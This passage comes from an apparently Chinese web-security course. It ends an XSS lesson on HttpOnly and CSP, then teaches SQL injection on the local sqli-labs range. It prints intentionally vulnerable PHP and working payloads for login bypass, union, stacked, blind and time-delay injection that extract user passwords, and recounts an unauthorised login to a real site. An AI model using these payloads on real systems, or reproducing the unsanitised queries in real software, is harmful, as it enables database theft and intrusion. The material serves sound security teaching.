<img src="./images/Cip5yF_gPDOAXIpRAAHMIeQ0UA0465.png" alt="Cip5yF_gPDOAXIpRAAHMIeQ0UA0465.png" width="80%">

</figure>

<p>
图 12：开启 HttpOnly Cookie
</p>

<p>
在 PHP 中，可以使用 setcookie 或 setrawcookie 的第 7个参数来开启，将其
设置为 TRUE 即可 HttpOnly：
</p>

<div class="org-src-container">
<pre class="src src-lang-php">setcookie("abc", "test", NULL, NULL, NULL, NULL, TRUE); 
setrawcookie("abc", "test", NULL, NULL, NULL, NULL, TRUE);
</pre>
</div>
</div>
</div>
<div id="outline-container-content-security-policy" class="outline-4">
<h4 id="content-security-policy">Content Security Policy</h4>
<div class="outline-text-4" id="text-content-security-policy">
<p>
内容安全策略（Content Security Policy，CSP）也是减少 XSS 攻击的一种方
式，是浏览器提供一种防御机制。它采用的是白名单机制，告诉浏览器可以加载
和执行哪些外部资源，这样就能防止被一些第三方恶意脚本注入执行。
</p>

<p>
开启 CSP 有两种方式：
</p>

<p>
（1）通过 HTTP 头信息的 Content-Security-Policy 的字段：
</p>

<div class="org-src-container">
<pre class="src src-lang-xml">Content-Security-Policy: script-src 'self'; object-src 'none';style-src cdn.example.org third-party.org; child-src https:
</pre>
</div>

<p>
（2）通过网页的=&lt;meta&gt;=标签设置：
</p>

<div class="org-src-container">
<pre class="src src-lang-xml">&lt;meta http-equiv="Content-Security-Policy" content="script-src 'self'; object-src 'none'; style-src cdn.example.org third-party.org; child-src https:"&gt;
</pre>
</div>

<p>
这里我对一些常用字段先做个解释：
</p>


<figure id="org290353f">
<img src="./images/CgpVE1_pfKyAAExhAAdH-EdHz9I669.png" alt="CgpVE1_pfKyAAExhAAdH-EdHz9I669.png" width="80%">

</figure>

<p>
常用指令值解释如下：
</p>


<figure id="org39eb8e2">
<img src="./images/CgqCHl_pfQaAAj0uAAHaIttkJoE538.png" alt="CgqCHl_pfQaAAj0uAAHaIttkJoE538.png" width="80%">

</figure>

<p>
之前有次测试，发现了一个 XSS漏洞，但死活利用不成功，搞半天一直没找到原
因，后来发现正是 CSP 限制了 JS资源的加载执行。
</p>

<p>
我平时测试时喜欢使用 CSP Evaluator 插件查看网站的 CSP 设置情况。Gmail
的CSP 设置情况如下图所示：
</p>


<figure id="orgb9f5455">
<img src="./images/Cip5yF_gPEmAfrG1AAEbuo1t3ss905.png" alt="Cip5yF_gPEmAfrG1AAEbuo1t3ss905.png" width="80%">

</figure>

<p>
图 13：Gmail 的 CSP 设置
</p>

<p>
在实际测试 XSS 时，有时也需要注意下 CSP 情况，避免折腾半天也没找到 XSS
利用失败的原因。现在 Google 内部一直在大力推行 CSP，这确实是一种防御
XSS攻击的有效办法。
</p>
</div>
</div>
</div>
<div id="outline-container-总结" class="outline-3">
<h3 id="总结">总结</h3>
<div class="outline-text-3" id="text-总结">
<p>
这一讲我介绍了黑盒测试和白盒测试这两种挖掘 XSS 漏洞的方法，并针对不同
的XSS 情况推荐了不同的防御方案，算是一份 XSS漏洞修复方案指引。同时，我
还介绍了一些在企业中经常用来防御 XSS攻击的方法：HttpOnly 和 CSP。它们
可以有效减少 XSS攻击带来的危害，但不能单纯依靠它们来防御 XSS，关键还是
要避免漏洞的发生。
</p>

<p>
如果你对 XSS漏洞的防御方法还有任何疑问，欢迎留言讨论。下一讲，我将带领
你踏上 SQL注入的攻防之路。
</p>


<figure id="org98843cd">
<img src="./images/Ciqc1F_pfMKAawzZAAUhtOcPIMw458.png" alt="Ciqc1F_pfMKAawzZAAUhtOcPIMw458.png" width="80%">

</figure>
</div>
</div>
</section>
<section id="outline-container-h:93de8275-f0ef-4731-bcd4-9b49cab8e05b" class="outline-2">
<h2 id="h:93de8275-f0ef-4731-bcd4-9b49cab8e05b">SQL 注入：小心数据库被拖走</h2>
<div class="outline-text-2" id="text-h:93de8275-f0ef-4731-bcd4-9b49cab8e05b">
<p>
你好，我是赢少良。我们现在来到了 SQL 注入的学习，这里我会主要介绍 SQL
注入漏洞的产生原理、利用、检测和防御。相信学完后，你就知道：
</p>

<ul class="org-ul">
<li>为什么 'or'1'='1 是个万能密码；</li>

<li>攻击者会如何进一步利用漏洞发动攻击窃取数据库；</li>

<li>开发如何检测和防御 SQL 注入漏洞。</li>
</ul>

<p>
这一讲，我主要讲解 SQL 注入与数据库拖库问题。
</p>

<p>
十几年前，我在网上偶然间看到一篇文章，号称有可登录任意网站管理后台的万
能密码，只要在用户名和密码中均输入'or'1'='1（注意单引号的使用）即可登
录后台。当时感觉特别神奇，也有点质疑，于是，我通过Google搜索了几个网站
后台，没想到有一个真的登录进去了，还可以直接修改主页内容。我没有动，给
管理员留言后就退出了。
</p>

<p>
后来，从网友那得知有个叫“明小子”的工具，专门用于检测和利用 SQL注入漏
洞，使用起来非常“傻瓜”。如果你很早接触过安全，相信对下面的界面图再熟
悉不过了。这是我第一次听说“SQL注入”这个词，知道了它属于 Web 漏洞中非
常常见的一种漏洞。
</p>


<figure id="orga275a8d">
<img src="./images/CgpVE1_gPOeAI7xSAABTJIYxcfE254.png" alt="CgpVE1_gPOeAI7xSAABTJIYxcfE254.png" width="80%">

</figure>

<p>
图 1：“明小子”工具
</p>

<p>
目前 PHP + MySQL + Linux一直是网站搭建的主流环境，我们也是在此环境下演
示的。其他数据库系统不再介绍，你可自行搜索相关资料拓展学习。同时，为了
简化环境搭建的工作，推荐使用Docker 安装 sqli-labs作为靶场来实践，具体
安装方法可参考《<a href="https://kaiwu.lagou.com/course/courseInfo.htm?courseId=585&amp;decorateId=396aca4423074fd39a878fc22e9ae663&amp;_channel_track_key=IIxiTicP#/detail/pc?id=5970">03 ​| 靶场：搭建漏洞练习环境</a>》中的内容。
</p>
</div>
<div id="outline-container-sql-注入产生的原因" class="outline-3">
<h3 id="sql-注入产生的原因">SQL 注入产生的原因</h3>
<div class="outline-text-3" id="text-sql-注入产生的原因">
<p>
以 sqli-labs 第 11 题为例，该题模拟后台登录页面，其 Username 与
Password均存在 SQL 注入漏洞。该题的 PHP 源码可直接点击<a href="https://github.com/Audi-1/sqli-labs/tree/master/Less-11">Github链接</a>查看，
也可以进 Docker 容器内查看。
</p>

<p>
为方便理解，我把 PHP 源码贴出来，并加上了注释：
</p>

<div class="org-src-container">
<pre class="src src-lang-php">&lt;?php
    //including the Mysql connect parameters.
    include("../sql-connections/sql-connect.php");
    error_reporting(0);

    // take the variables
    if(isset($_POST['uname']) &amp;&amp; isset($_POST['passwd']))
    {
        $uname=$_POST['uname'];    // 用户输入的用户名
        $passwd=$_POST['passwd'];  // 用户输入的密码
        //logging the connection parameters to a file for analysis.
        $fp=fopen('result.txt','a');
        fwrite($fp,'User Name:'.$uname);
        fwrite($fp,'Password:'.$passwd."\n");
        fclose($fp);

        // connectivity 
        // 未经过滤，直接将用户输入带入 SQL 语句进行查询，最终导致 SQL 注入
        @$sql="SELECT username, password FROM users WHERE username='$uname' and password='$passwd' LIMIT 0,1";
        $result=mysql_query($sql);
        $row = mysql_fetch_array($result);

        if($row)
        {
            // 查询到数据就登录成功
            //echo '&lt;font color= "#0000ff"&gt;';          
            echo "&lt;br&gt;

";
            echo '&lt;font color= "#FFFF00" font size = 4&gt;';
            //echo " You Have successfully logged in\n\n " ;
            echo '&lt;font size="3" color="#0000ff"&gt;';    
            echo "&lt;br&gt;

";
            echo 'Your Login name:'. $row['username'];
            echo "&lt;br&gt;

";
            echo 'Your Password:' .$row['password'];
            echo "&lt;br&gt;

";
            echo "&lt;/font&gt;";
            echo "&lt;br&gt;

";
            echo "&lt;br&gt;

";
            echo '&lt;img src="../images/flag.jpg"  /&gt;';  

            echo "&lt;/font&gt;";
        }
        else
        {
            // 登录失败
            echo '&lt;font color= "#0000ff" font size="3"&gt;';
            //echo "Try again looser";
            print_r(mysql_error());
            echo "&lt;/br&gt;";
            echo "&lt;/br&gt;";
            echo "&lt;/br&gt;";
            echo '&lt;img src="../images/slap.jpg" /&gt;';   
            echo "&lt;/font&gt;";
        }
    }
?&gt;
</pre>
</div>

<p>
可以看到，用户在登录框输入的用户名及密码未经过滤就直接传入以下 SQL
语句：
</p>

<div class="org-src-container">
<pre class="src src-lang-sql">SELECT username, password FROM users WHERE username='$uname' and password='$passwd' LIMIT 0,1
</pre>
</div>

<p>
如果此时我在 Username 中输入英文单引号，那么 SQL 语句就变成：
</p>

<div class="org-src-container">
<pre class="src src-lang-sql">SELECT username, password FROM users WHERE username=''' and password='' LIMIT 0,1
</pre>
</div>

<p>
这里 username 没有闭合，会导致语法错误：
</p>

<blockquote>
<p>
You have an error in your SQL syntax；check the manual that corresponds
to your MySQL server version for the right syntax to use near '''' and
password='' LIMIT 0,1' at line 1。
</p>
</blockquote>


<figure id="orge7c7f47">
<img src="./images/CgpVE1_gPPmAe_Z_AALZLcXi9OA547.png" alt="CgpVE1_gPPmAe_Z_AALZLcXi9OA547.png" width="80%">

</figure>

<p>
图 2：username 没有闭合导致的语法错误
</p>

<p>
还记得开头提到的万能密码吗？我们输入试试：
</p>


<figure id="org61b6ca3">
<img src="./images/Cip5yF_gPP6AYussAALaISw7_cc369.png" alt="Cip5yF_gPP6AYussAALaISw7_cc369.png" width="80%">

</figure>

<p>
图 3：输入万能钥匙
</p>

<p>
成功登录了！那为什么会这样呢？
</p>

<p>
我们先来看下输入万能密码后，SQL 语句的构成：
</p>

<div class="org-src-container">
<pre class="src src-lang-sql">SELECT username, password FROM users WHERE username=''or'1'='1' and password=''or'1'='1' LIMIT 0,1
</pre>
</div>


<pre class="example" id="orgeac3ea8">
可以发现 username 和 password 为空或者 '1'='1' ，而 '1'='`' 永远为
真，SQL语句必然成立。只要能查询到有效数据就可以登录，或者后面随便回句
永远为真的语句就能够绕过验证登录，这就是万能密码存在的原因。
</pre>

<p>
相信看到这里，你对 SQL注入产生的原因应该有所理解了。简单来讲，就是开发
时未对用户的输入数据（可能是GET 或 POST 参数，也可能是 Cookie、HTTP 头
等）进行有效过滤，直接带入 SQL语句解析，使得原本应为参数数据的内容，却
被用来拼接 SQL语句做解析，也就是说， <b>将数据当代码解析，最终导致 SQL
注入漏洞的产生</b> 。
</p>

<p>
关于此类漏洞的防御我会在《09 | CSRF 漏洞：谁改了我的密码？》中介绍。
</p>
</div>
</div>
<div id="outline-container-sql-注入的分类" class="outline-3">
<h3 id="sql-注入的分类">SQL 注入的分类</h3>
<div class="outline-text-3" id="text-sql-注入的分类">
<p>
我们接着来了解 SQL注入的分类。根据注入点（比如漏洞参数）的数据类型不同，
SQL注入可以分为两类：数字/整数型注入和字符型注入。
</p>
</div>
<div id="outline-container-数字整数型注入" class="outline-4">
<h4 id="数字整数型注入">数字/整数型注入</h4>
<div class="outline-text-4" id="text-数字整数型注入">
<p>
注入的参数为整数时就是数字型注入，或者叫整数型注入。其 SQL语句原型类似：
</p>

<div class="org-src-container">
<pre class="src src-lang-sql">SELECT * FROM table WHERE id=1
</pre>
</div>

<p>
此处 id 参数为整数，两边无引号。测试时可以使用 1+1 和 3-1这种计算结果
相同的参数值去构造请示，对比响应结果是否一致，如果相同就可能在数字型注
入。
</p>
</div>
</div>
<div id="outline-container-字符型注入" class="outline-4">
<h4 id="字符型注入">字符型注入</h4>
<div class="outline-text-4" id="text-字符型注入">
<p>
注入参数为字符串时就是字符型注入，其 SQL 语句原型类似：
</p>

<div class="org-src-container">
<pre class="src src-lang-sql">SELECT * FROM table WHERE name='test'
</pre>
</div>

<p>
此处的 name 为字符串参数，两边包含引号。
</p>

<p>
其他资料也有给出第 3种分类： <b>搜索型注入</b> ，但我认为它本质上属于字符型
注入，只是相对特殊一点，存在于搜索语句中。此类注入常常以% 为关键字来闭
合 SQL 语句。
</p>

<p>
区分数字型与字符型注入的最简单办法就是看 <b>是否存在引号</b> 。在有源码的情
况下很好判断，若无源码，可以尝试输入单引号看是否报错，同时也可以直接根
据输入参数的类型做初步判断。
</p>

<p>
了解了 SQL注入的分类后，就可以针对不同的注入类型采取不同的注入测试技术。
</p>
</div>
</div>
</div>
<div id="outline-container-sql-注入测试技术" class="outline-3">
<h3 id="sql-注入测试技术">SQL 注入测试技术</h3>
<div class="outline-text-3" id="text-sql-注入测试技术">
<p>
我认为当前 SQL 注入利用工具中，sqlmap 无疑是王者。它涵盖了 SQL注入检测、
利用、防御绕过、扩展、getshell等多种功能，功能全面且工程化，是学习研究
SQL 注入绕不开的工具。
</p>

<p>
如果你查看 sqlmap 的命令帮助信息，可以发现它使用的 SQL 注入技术共有以
下6 种，默认全开，对应的参数值为“BEUSTQ”，如下所示：
</p>

<div class="org-src-container">
<pre class="src src-lang-java">Techniques:
  These options can be used to tweak testing of specific SQL injection
  techniques
  --technique=TECH..  SQL injection techniques to use (default "BEUSTQ")
</pre>
</div>

<p>
BEUSTQ 的参数含义如下：
</p>

<ul class="org-ul">
<li>B，Boolean-based blind（布尔型盲注）；</li>

<li>E，Error-based（报错型注入）；</li>

<li>U，Union query-based（联合查询注入）；</li>

<li>S，Stacked queries（多语句堆叠注入）；</li>

<li>T，Time-based blind（基于时间延迟盲注）；</li>

<li>Q，Inline queries（内联/嵌套查询注入）。</li>
</ul>

<p>
下面我就重点来讲解这 6 大 SQL 注入技术。
</p>
</div>
<div id="outline-container-布尔型盲注" class="outline-4">
<h4 id="布尔型盲注">布尔型盲注</h4>
<div class="outline-text-4" id="text-布尔型盲注">
<p>
布尔（Boolean）就是真假两种结果，比如“1=1”为真，“1=2”为假。
</p>

<p>
前面列举的 SQL 注入是存在错误显示的，很容易判断 SQL语句被注入后出错。
但是，很多时间并没有错误回显，这时就只能“盲注”。我们可以通过对比真假
请求的响应内容来判断是否存在SQL 注入，这就是布尔型盲注。比如，对比注入
参数与“and 1=2”的返回结果，如果两者不同则代表可能存在 SQL 注入。
</p>

<p>
除了布尔型盲注外，我们还可以采用时间延迟的方式来盲注，我在后面会讲到。
</p>


<figure id="orgb447417">
<img src="./images/Cip5yF_gPQ2AHPOrAAMq22_Vn7A821.png" alt="Cip5yF_gPQ2AHPOrAAMq22_Vn7A821.png" width="80%">

</figure>

<p>
图 4：正常访问的页面
</p>

<p>
以 sqli-labs 第 8 题为例，上图是正常访问后的网页内容。通过 Get 参数 id
实现 SQL 注入，我们直接用前面讲的单引号注入试试，请求地址为
</p>

<p>
<a href="http://localhost/Less-8/?id=1'">http://localhost/Less-8/?id=1'</a>，返回结果如下：
</p>


<figure id="org6ea0a32">
<img src="./images/CgpVE1_gPRWATvHkAAMWNlgn8Q0897.png" alt="CgpVE1_gPRWATvHkAAMWNlgn8Q0897.png" width="80%">

</figure>

<p>
图 5：单引号注入的返回结果
</p>

<p>
没有任何错误提示，显示此方法行不通。
</p>

<p>
下面我们试试布尔型盲注的方法，分别构造以下两个请示，然后对比二者的差异：
</p>

<ul class="org-ul">
<li><a href="http://localhost/Less-8/?id=1'and+1=1">http://localhost/Less-8/?id=1'and+1=1</a></li>

<li><a href="http://localhost/Less-8/?id=1'and+1=2">http://localhost/Less-8/?id=1'and+1=2</a></li>
</ul>

<p>
其中的 + 号代表空格，执行上述请求后，你会发现返回的页面没有任何变化。
难道真没有SQL 注入吗？
</p>

<p>
我们来看一下源码：
</p>

<div class="org-src-container">
<pre class="src src-lang-php">&lt;?php
    //including the Mysql connect parameters.
    include("../sql-connections/sql-connect.php");
    error_reporting(0);
    // take the variables
    if(isset($_GET['id']))
    {
      $id=$_GET['id'];
      //logging the connection parameters to a file for analysis.
      $fp=fopen('result.txt','a');
      fwrite($fp,'ID:'.$id."\n");
      fclose($fp);

      // connectivity 
      $sql="SELECT * FROM users WHERE id='$id' LIMIT 0,1";
      $result=mysql_query($sql);
       $row = mysql_fetch_array($result);

      if($row)
       {
          // 成功
          echo '&lt;font size="5" color="#FFFF00"&gt;';  
          echo 'You are in...........';
          echo "&lt;br&gt;

";
          echo "&lt;/font&gt;";
        }
        else 
        {
          // 失败，关闭错误回显
          echo '&lt;font size="5" color="#FFFF00"&gt;';
          //echo 'You are in...........';
          //print_r(mysql_error());
          //echo "You have an error in your SQL syntax";
          echo "&lt;/br&gt;&lt;/font&gt;";   
          echo '&lt;font color= "#0000ff" font size= 3&gt;'; 

        }
    }
        else { echo "Please input the ID as parameter with numeric value";}
?&gt;
</pre>
</div>

<p>
重点就在这句 SQL 语句上：
</p>

<div class="org-src-container">
<pre class="src src-lang-sql">SELECT * FROM users WHERE id='$id' LIMIT 0,1
</pre>
</div>

<p>
注意这里有单引号，所以是字符型注入，我们将前面的测试语句代入：
</p>

<div class="org-src-container">
<pre class="src src-lang-sql">SELECT * FROM users WHERE id='1'and 1=1' LIMIT 0,1
</pre>
</div>

<p>
此处单引号未得到闭合，导致了语法错误，这正是前面测试方法失败的原因。我
们可以考虑用&#x2013;注释掉。 <b>在URL 请求里要注意在后面加 + ，+ 在 URL 中相当
于空格，加了 + 才能有效注释</b> 。最后我们得到构造语句：
</p>

<div class="org-src-container">
<pre class="src src-lang-sql">SELECT * FROM users WHERE id='1'and 1=1 -- ' LIMIT 0,1
</pre>
</div>

<p>
为了方便验证 SQL 语句，推荐你直接进入 Docker 容器的 MySQL 进行测试：
</p>

<div class="org-src-container">
<pre class="src src-sh">$ sudo docker ps
CONTAINER ID        IMAGE                COMMAND             CREATED             STATUS              PORTS                          NAMES
ea6ec615a39e        acgpiano/sqli-labs   <span style="color: #8b2252;">"/run.sh"</span>           29 hours ago        Up 29 hours         0.0.0.0:80-&gt;80/tcp, 3306/tcp   sqli-labs
$ sudo docker exec -it ea6ec615a39e /bin/bash
$ root@ea6ec615a39e:/# mysql -u root
mysql&gt; use security;
mysql&gt; SELECT * FROM users WHERE <span style="color: #a0522d;">id</span>=<span style="color: #8b2252;">'1'</span> LIMIT 0,1;
+----+----------+----------+
| id | username | password |
+----+----------+----------+
|  1 | Dumb     | Dumb     |
+----+----------+----------+
1 row<span style="color: #a020f0;"> in</span> set (0.00 sec)

mysql&gt; SELECT * FROM users WHERE <span style="color: #a0522d;">id</span>=<span style="color: #8b2252;">'1 and 1=1'</span> LIMIT 0,1;
+----+----------+----------+
| id | username | password |
+----+----------+----------+
|  1 | Dumb     | Dumb     |
+----+----------+----------+
1 row<span style="color: #a020f0;"> in</span> set, 1 warning (0.00 sec)

mysql&gt; SELECT * FROM users WHERE <span style="color: #a0522d;">id</span>=<span style="color: #8b2252;">'1 and 1=2'</span> LIMIT 0,1;
+----+----------+----------+
| id | username | password |
+----+----------+----------+
|  1 | Dumb     | Dumb     |
+----+----------+----------+
1 row<span style="color: #a020f0;"> in</span> set, 1 warning (0.00 sec)

mysql&gt; SELECT * FROM users WHERE <span style="color: #a0522d;">id</span>=<span style="color: #8b2252;">'1'</span> and <span style="color: #a0522d;">1</span>=2<span style="color: #8b2252;">''</span> LIMIT 0,1;
ERROR 1064 (42000): You have an error<span style="color: #a020f0;"> in</span> your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near <span style="color: #8b2252;">''' LIMIT 0,1'</span> at line 1
mysql&gt; SELECT * FROM users WHERE <span style="color: #a0522d;">id</span>=<span style="color: #8b2252;">'1'</span> and <span style="color: #a0522d;">1</span>=2-- <span style="color: #8b2252;">' LIMIT 0,1;</span>
<span style="color: #8b2252;">Empty set (0.00 sec)</span>

<span style="color: #8b2252;">mysql&gt; SELECT * FROM users WHERE id='</span>1<span style="color: #8b2252;">' and 1=1-- '</span> LIMIT 0,1;
+----+----------+----------+
| id | username | password |
+----+----------+----------+
|  1 | Dumb     | Dumb     |
+----+----------+----------+
1 row<span style="color: #a020f0;"> in</span> set (0.00 sec)
</pre>
</div>

<p>
现在我们按此思路重新构造两个请求。
</p>

<ul class="org-ul">
<li>请求 1：<a href="http://localhost/Less-8/?id=1'and+1=1--+">http://localhost/Less-8/?id=1'and+1=1--+</a></li>

<li>请求 2：<a href="http://localhost/Less-8/?id=1'and+1=2--+">http://localhost/Less-8/?id=1'and+1=2--+</a></li>
</ul>


<figure id="org0bea692">
<img src="./images/CgpVE1_gPSSAcUf3AAOSbJ2meEM358.png" alt="CgpVE1_gPSSAcUf3AAOSbJ2meEM358.png" width="80%">

</figure>

<p>
图 6：请求 1 展示图
</p>


<figure id="orgd7d468e">
<img src="./images/CgpVE1_gPSqACFm1AAOOcCQ2IIE741.png" alt="CgpVE1_gPSqACFm1AAOOcCQ2IIE741.png" width="80%">

</figure>

<p>
图 7：请求 2 展示图
</p>

<p>
我们可以看到，两次结果是不一样的，主要体现在有无“You are
in&#x2026;&#x2026;&#x2026;..”字符串，此时我们就可以确认 SQL 注入是存在的。
</p>
</div>
</div>
<div id="outline-container-报错型注入" class="outline-4">
<h4 id="报错型注入">报错型注入</h4>
<div class="outline-text-4" id="text-报错型注入">
<p>
有错误回显的都可以尝试使用报错型注入方法，在 sqli-labs 第 11题中介绍的
单引号注入方式就是最简单有效的检测方法，它的本质是设法构造出错误的SQL
语法使其执行错误。
</p>

<p>
前面列举的都是字符型注入，这次我们聊下整数型的。以 sqli-labs 第 2题为
例，我们重点看下导致注入的语句：
</p>

<div class="org-src-container">
<pre class="src src-lang-sql">$sql="SELECT * FROM users WHERE id=$id LIMIT 0,1";
</pre>
</div>

<p>
$id参数两边无引号，这是典型的整数型注入。虽然是整数型的，但你使用单引
号注入依然会报错，因为语句未得到有效闭合。
</p>

<p>
既然我们的目标是让 SQL语法错误，那方法就多了，各种造成语句无法闭合的字
符：单引号、双引号、大中小括号等标点符号、特殊符号、宽字符等，还有SQL
语句中的关键词，比如 IF、SELECT 都可以。
</p>

<p>
下图是注入中文句号（宽字符）导致的错误：
</p>


<figure id="orgecf06c5">
<img src="./images/CgpVE1_gPTmAH1smAAOLYXHDOxU134.png" alt="CgpVE1_gPTmAH1smAAOLYXHDOxU134.png" width="80%">

</figure>

<p>
图 8：宽字符导致的错误
</p>

<p>
注入关键词 IF 导致的错误：
</p>


<figure id="org6879fa7">
<img src="./images/Cip5yF_gPT-AD3rcAAOEXKoNpik989.png" alt="Cip5yF_gPT-AD3rcAAOEXKoNpik989.png" width="80%">

</figure>

<p>
图 9：注入关键词 IF 导致的错误
</p>

<p>
拥有错误回显的 SQL注入应该是最容易发现的，但很多时候并不会有错误回显，
这时就需要使用其他盲注方式来验证。
</p>
</div>
</div>
<div id="outline-container-联合查询注入" class="outline-4">
<h4 id="联合查询注入">联合查询注入</h4>
<div class="outline-text-4" id="text-联合查询注入">
<p>
联合查询是指使用 union 语句来查询，比如：
</p>

<div class="org-src-container">
<pre class="src src-lang-sql">id =-1 union select 1,2,3
</pre>
</div>

<p>
<b>注意这里 id 的值不存在，目前是为了在页面上显示 union 查询结果</b> 。
</p>

<p>
这样的好处就相当于另起一句 SQL语句，非常适用于获取数据库中一些敏感信息，
而不必过多考虑原有 SQL语句的情况。因此，它在实际的漏洞利用中也经常被使
用。联合查询注入也是验证漏洞可利用性的最佳方法之一，但经常需要结合错误
回显。
</p>

<p>
我们仍以 sqli-labs 第 2 题为例，先构造以下请求：
</p>

<div class="org-src-container">
<pre class="src src-lang-sql">http://localhost/Less-2/?id=0 union select 1
</pre>
</div>

<p>
得到错误提示“The used SELECT statements have a different number of
columns”，也就是字段数有误，如下图所示：
</p>


<figure id="org6ab64cb">
<img src="./images/CgpVE1_gPUqADu50AANtXLBwuf0866.png" alt="CgpVE1_gPUqADu50AANtXLBwuf0866.png" width="80%">

</figure>

<p>
图 10：字段数有误
</p>

<p>
此时我们可以逐渐增加字段数来找到合适字段数：
</p>

<div class="org-src-container">
<pre class="src src-lang-sql">回显错误：http://localhost/Less-2/?id=0 union select 1,2
正确：http://localhost/Less-2/?id=0 union select 1,2,3
回显错误：http://localhost/Less-2/?id=0 union select 1,2,3,4
</pre>
</div>

<p>
最后发现它共有 3 个字段，我们看看哪些字段显示出来了：
</p>


<figure id="org946d7ea">
<img src="./images/Cip5yF_gPVGAYoxhAANs6mFjRDI693.png" alt="Cip5yF_gPVGAYoxhAANs6mFjRDI693.png" width="80%">

</figure>

<p>
图 11：字段展示
</p>

<p>
可以发现 2 和 3字段显示在页面中，这里我们就可以进一步构造利用以获取数
据库名和版本信息：
</p>

<div class="org-src-container">
<pre class="src src-lang-sql">http://localhost/Less-2/?id=0 union select 1,database(),version()
</pre>
</div>

<p>
最终，我们成功爆出数据库名为 security，版本为5.5.44-0ubuntu0.14.04.1，
如下图所示：
</p>


<figure id="org12c40a0">
<img src="./images/Cip5yF_gPVmAaBouAAN-25Njwzw855.png" alt="Cip5yF_gPVmAaBouAAN-25Njwzw855.png" width="80%">

</figure>

<p>
图 12：成功爆出数据库名
</p>
</div>
</div>
<div id="outline-container-多语句堆叠注入" class="outline-4">
<h4 id="多语句堆叠注入">多语句堆叠注入</h4>
<div class="outline-text-4" id="text-多语句堆叠注入">
<p>
在 SQL 语句中，允许使用分号间隔多个查询语句来执行。
mysqli_multi_query()函数可以通过分号间隔插入多个查询语句实现堆叠注入。
以 sqli-labs 第 38题为例：
</p>

<div class="org-src-container">
<pre class="src src-lang-php">&lt;?php
    $id=$_GET['id'];
    ......
    $sql="SELECT * FROM users WHERE id='$id' LIMIT 0,1";
    /* execute multi query */
    if (mysqli_multi_query($con1, $sql))
    {
       ......
    }
    ......
?&gt;
</pre>
</div>

<p>
此处正是使用 mysqli_multi_query函数实现的多语句查询。我们可以尝试插入
另一条语句来创建表：
</p>

<div class="org-src-container">
<pre class="src src-lang-sql">http://localhost/Less-38?id=1';create table sqli like users;
</pre>
</div>

<p>
执行前的表：
</p>

<pre class="example" id="org0cea3cd">
mysql&gt; show tables;
+--------------------+
| Tables_in_security |
+--------------------+
| emails             |
| referers           |
| uagents            |
| users              |
+--------------------+
4 rows in set (0.00 sec)

</pre>

<p>
执行后，成功创建 sqli 表，说明第二条语句执行成功：
</p>

<pre class="example" id="org32dde15">
mysql&gt; show tables;
+--------------------+
| Tables_in_security |
+--------------------+
| emails             |
| referers           |
| sqli               |
| uagents            |
| users              |
+--------------------+
5 rows in set (0.00 sec)
</pre>
</div>
</div>
<div id="outline-container-基于时间延迟盲注" class="outline-4">
<h4 id="基于时间延迟盲注">基于时间延迟盲注</h4>
<div class="outline-text-4" id="text-基于时间延迟盲注">
<p>
基于时间延迟盲注是通过时间延迟来判断是否存在 SQL注入的常用方法，是用于
无任何错误回显情况下的盲注。对于正确语句和错误语句都返回相同内容时也可
以使用，所以它的适用范围相对广一些。
</p>

<blockquote>
<p>
注意：在实际测试过程中，特别是线上业务测试，要避免使用过长时间的延时，否则会影响业务的正常运行。换句话说，能够延时注入就基本代表可以去网站进行拒绝服务攻击。
</p>
</blockquote>

<p>
在 MySQL 常用的延时注入方法中，比较实用的有以下 3 种。
</p>

<p>
（1） <b>SLEEP(duration)</b> ：该函数用于休眠，起到延时操作的作用，其参数以秒为单位。
</p>

<div class="org-src-container">
<pre class="src src-lang-java">mysql&gt; select sleep(5);
+----------+
| sleep(5) |
+----------+
|        0 |
+----------+
1 row in set (5.00 sec)
</pre>
</div>

<p>
（2） <b>BENCHMARK(count,expr)</b> ：重复计算 expr 表达式 count 次。
</p>

<div class="org-src-container">
<pre class="src src-lang-java">mysql&gt; select benchmark(10000000,sha(1));
+----------------------------+
| benchmark(10000000,sha(1)) |
+----------------------------+
|                          0 |
+----------------------------+
1 row in set (2.72 sec)
</pre>
</div>

<p>
（3） <b>REPEAT(str,count)</b> ：返回字符串 str 重复 count 次后的字符串。
</p>

<div class="org-src-container">
<pre class="src src-lang-java">mysql&gt; select rpad('a',4999999,'a') RLIKE concat(repeat('(a.*)+',50),'b');
+-------------------------------------------------------------+
| rpad('a',4999999,'a') RLIKE concat(repeat('(a.*)+',50),'b') |
+-------------------------------------------------------------+
|                                                           0 |
+-------------------------------------------------------------+
1 row in set (5.92 sec)
</pre>
</div>

<p>
我们以 sqli-labs 第 2 题为例构造请求：
</p>

<div class="org-src-container">
<pre class="src src-lang-sql">http://localhost/Less-2/?id=1 and sleep(5)--+
</pre>
</div>

<p>
在 Chrome 浏览器的 Network 标签内可以看到该请求刚好处时 5秒钟，说明确
实存在漏洞。
</p>


<figure id="org50855ff">
<img src="./images/CgpVE1_gPWaAOKOTAABkBqvFPw0394.png" alt="CgpVE1_gPWaAOKOTAABkBqvFPw0394.png" width="80%">

</figure>

<p>
图 13：Chrome 标签内展示
</p>
</div>
</div>
<div id="outline-container-内联嵌套查询注入" class="outline-4">
<h4 id="内联嵌套查询注入">内联/嵌套查询注入</h4>
<div class="outline-text-4" id="text-内联嵌套查询注入">
<p>
使用内联查询来检索数据，本质上是嵌入在另一个查询中的查询，例如：
</p>

<div class="org-src-container">
<pre class="src src-lang-sql">SELECT (SELECT password from users) from product;
</pre>
</div>

<p>
以 sqli-labs 第 2 题为例，结合前面介绍的联合查询来构造请求：
</p>

<div class="org-src-container">
<pre class="src src-lang-java">http://localhost/Less-2/?id=0 union select 1,(SELECT username from users where id=2),(SELECT password from users where id=2)
</pre>
</div>

<p>
通过以上代码我们可以看到 id=2 的用户名和密码，如下图所示：
</p>


<figure id="org13408cf">
<img src="./images/CgpVE1_gPW-AdtmmAAOCJCqUXmU735.png" alt="CgpVE1_gPW-AdtmmAAOCJCqUXmU735.png" width="80%">

</figure>

<p>
图 14：内联/嵌套查询注入
</p>

<p>
内联/嵌套查询注入方法可以在一句语句中嵌入另一句语句，在有限漏洞场景下
能实现更多的功能，因此在实际的漏洞利用中常被用于实现敏感信息的窃取，甚
至执行系统命令。
</p>
</div>
</div>
</div>
<div id="outline-container-总结" class="outline-3">
<h3 id="总结">总结</h3>
<div class="outline-text-3" id="text-总结">
<p>
这一讲我主要介绍了 SQL 注入的产生原理、分类，以及相关的测试技术。SQL注
入产生的原因是由于开发对用户的输入数据未做有效过滤，直接引用 SQL语句执
行，导致原本的数据被当作 SQL 语句执行。通常来说，SQL注入分为数字型和字
